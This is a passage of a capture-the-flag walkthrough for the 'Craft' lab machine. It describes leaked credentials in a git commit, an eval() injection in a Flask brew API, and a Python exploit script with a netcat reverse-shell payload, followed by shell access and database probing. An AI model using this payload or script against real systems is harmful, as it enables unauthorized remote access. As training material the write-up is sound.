
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;We see from the output above that ports &lt;strong&gt;22&lt;/strong&gt; and &lt;strong&gt;443&lt;/strong&gt; are open, meaning we’ve got &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; to play with. Let’s explore port &lt;strong&gt;443&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;port-443-craft&quot;&gt;Port 443: Craft&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/01/craft/craft_homepage.png&quot; alt=&quot;Craft Homepage&quot; /&gt;
&lt;strong&gt;Figure 1:&lt;/strong&gt; Craft’s Homepage&lt;/p&gt;

&lt;p&gt;So it looks like there are some links to subdomains. Let’s add these to our &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file so that we can access the other virtual hosts running on the box.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/hosts
&lt;span class=&quot;go&quot;&gt;127.0.0.1 localhost
127.0.1.1 kali
10.10.10.110    craft.htb
10.10.10.110    api.craft.htb
10.10.10.110    gogs.craft.htb

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;The following lines are desirable &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;IPv6 capable hosts
&lt;span class=&quot;go&quot;&gt;::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we can access the two links in the upper right hand corner &lt;code class=&quot;highlighter-rouge&quot;&gt;https://api.craft.htb/api&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;https://gogs.craft.htb&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We see the documentation page for &lt;code class=&quot;highlighter-rouge&quot;&gt;Craft API 1.0&lt;/code&gt;. The page gives us some information about the API’s endpoints and how to interact with them.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/01/craft/craft_api_page.png&quot; alt=&quot;Craft API 1.0&quot; /&gt;
&lt;strong&gt;Figure 2:&lt;/strong&gt; Craft API 1.0&lt;/p&gt;

&lt;p&gt;The other link on the page is to &lt;em&gt;&lt;a href=&quot;https://gogs.io/&quot;&gt;Gogs&lt;/a&gt;&lt;/em&gt;, a self hosted git repository. This is fun! It looks like we may get to hack an open source program. Does this remind you of digging through repos on &lt;em&gt;&lt;a href=&quot;https://github.com&quot;&gt;GitHub&lt;/a&gt;&lt;/em&gt;?&lt;/p&gt;

&lt;p&gt;Going through the commit history we come across some committed credentials right away. The screenshot actually contains the commit in which they were removed, but we can see through red highlighting!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/01/craft/gogs_credentials.png&quot; alt=&quot;API Credentials in Commit&quot; /&gt;
&lt;strong&gt;Figure 3:&lt;/strong&gt; API Credentials in Commit&lt;/p&gt;

&lt;p&gt;It looks like these credentials will also log us into the Gogs account for Dinesh, but there’s nothing much to see inside Dinesh’s account.&lt;/p&gt;

&lt;p&gt;By taking a look at the Craft API code we see it’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;Python / Flask&lt;/code&gt; application. Furthermore, it looks like the endpoint &lt;code class=&quot;highlighter-rouge&quot;&gt;/craft_api/api/brew/endpoints/brew.py&lt;/code&gt; calls the &lt;code class=&quot;highlighter-rouge&quot;&gt;eval()&lt;/code&gt; function on user input!. It says that authentication is required, but I think we’ve got that covered already with  &lt;code class=&quot;highlighter-rouge&quot;&gt;auth=('dinesh', '4aUh0A8PbVJxgd')&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/01/craft/eval_in_brew_endpoint.png&quot; alt=&quot;Eval code in brew.py&quot; /&gt;
&lt;strong&gt;Figure 4:&lt;/strong&gt; Exploitable code in &lt;code class=&quot;highlighter-rouge&quot;&gt;/craft_api/api/brew/endpoints/brew.py&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auth_required&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;expect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;beer_entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
        Creates a new brew entry.
        &quot;&quot;&quot;&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;# make sure the ABV value is sane.
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'%s &amp;gt; 1'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'abv'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]):&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABV must be a decimal value less than 1.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;create_brew&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;201&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We could use &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;postman&lt;/code&gt; to send requests to the API, but if we continue to look through the git repo we see in commit &lt;code class=&quot;highlighter-rouge&quot;&gt;10e3ba4f0a09c778d7cec673f28d410b73455a86&lt;/code&gt; that they’ve got a test script already to post new brews.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/01/craft/added_test.png&quot; alt=&quot;Added test&quot; /&gt;
&lt;strong&gt;Figure 5:&lt;/strong&gt; add test script you say!?&lt;/p&gt;

&lt;p&gt;Download the test script from here and we’ll use it to send a payload to the app. &lt;code class=&quot;highlighter-rouge&quot;&gt;https://gogs.craft.htb/Craft/craft-api/src/10e3ba4f0a09c778d7cec673f28d410b73455a86/tests/test.py&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;

&lt;h2 id=&quot;initial-foothold&quot;&gt;Initial Foothold&lt;/h2&gt;
&lt;p&gt;So far we’ve found an API, a &lt;code class=&quot;highlighter-rouge&quot;&gt;git&lt;/code&gt; repository containing Python code which seems vulnerable to command injection, as well as a commit containing credentials and a test script.&lt;/p&gt;

&lt;p&gt;Developing the exploit isn’t easy. We can test the code locally but we don’t know exactly what’s installed on the machine. This process required developing several payloads that ran correctly locally, only to fail on the box. As it turns out, the box doesn’t have &lt;code class=&quot;highlighter-rouge&quot;&gt;bash&lt;/code&gt; installed on it. Eventually we’re able to gain a reverse shell using netcat with the following payload sent to &lt;code class=&quot;highlighter-rouge&quot;&gt;avb&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;__import__(&quot;os&quot;).system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.186 4444 &amp;gt;/tmp/f&quot;) &quot;&quot;&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here’s the modified &lt;code class=&quot;highlighter-rouge&quot;&gt;test.py&lt;/code&gt; script with the payload to call our reverse shell.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;json&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'https://api.craft.htb/api/auth/login'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;auth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'dinesh'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'4aUh0A8PbVJxgd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;json_response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;json_response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'token'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;__import__(&quot;os&quot;).system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.186 4444 &amp;gt;/tmp/f&quot;) &quot;&quot;&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'X-Craft-API-Token'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Content-Type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'application/json'&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# create a sample brew with real shell code... should exploit!
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Create exploit brew!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;brew_dict&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;brew_dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'abv'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;brew_dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'bullshit199iii1'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;brew_dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'brewer'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'bullshit1991'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;brew_dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'style'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'bullshi1991t'&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;json_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;brew_dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'https://api.craft.htb/api/brew/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When we run the script with our sexy little payload we catch a reverse shell, and gain our initial foothold.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:/media/sf_Research#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 4444
&lt;span class=&quot;go&quot;&gt;listening on [any] 4444 ...
connect to [10.10.14.186] from craft.htb [10.10.10.110] 35703
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;/bin/sh: can't access tty;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;job control turned off
&lt;span class=&quot;gp&quot;&gt;/opt/app #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;root
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;/opt/app #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /
&lt;span class=&quot;gp&quot;&gt;/ #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;total 64
drwxr-xr-x    1 root     root          4096 Feb 10  2019 .
drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
-rwxr-xr-x    1 root     root             0 Feb 10  2019 .dockerenv
&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;...
...
...
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;/ #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;user-flag&quot;&gt;User Flag&lt;/h2&gt;
&lt;p&gt;It looks like we’re in a docker container, so we need to escape that somehow. Under &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/app&lt;/code&gt; we see a file named &lt;code class=&quot;highlighter-rouge&quot;&gt;dbtest.py&lt;/code&gt;. Here are the contents of that file.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pymysql&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;craft_api&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# test connection to mysql database
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pymysql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MYSQL_DATABASE_HOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                             &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MYSQL_DATABASE_USER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                             &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MYSQL_DATABASE_PASSWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                             &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MYSQL_DATABASE_DB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                             &lt;span class=&quot;n&quot;&gt;cursorclass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pymysql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cursors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DictCursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1&quot;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fetchone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;finally&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we modify &lt;code class=&quot;highlighter-rouge&quot;&gt;dbtest.py&lt;/code&gt; to execute other commands we can explore the application’s mysql database a bit more.&lt;/p&gt;

&lt;p&gt;First, let’s see what tables we have in here. We replace the sql statement above with one to show us the tables, and replace the &lt;code class=&quot;highlighter-rouge&quot;&gt;fetchone()&lt;/code&gt; command with &lt;code class=&quot;highlighter-rouge&quot;&gt;fetchall()&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SHOW TABLES&quot;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fetchall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;finally&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here’s what we get for tables in the craft database.&lt;/p&gt;

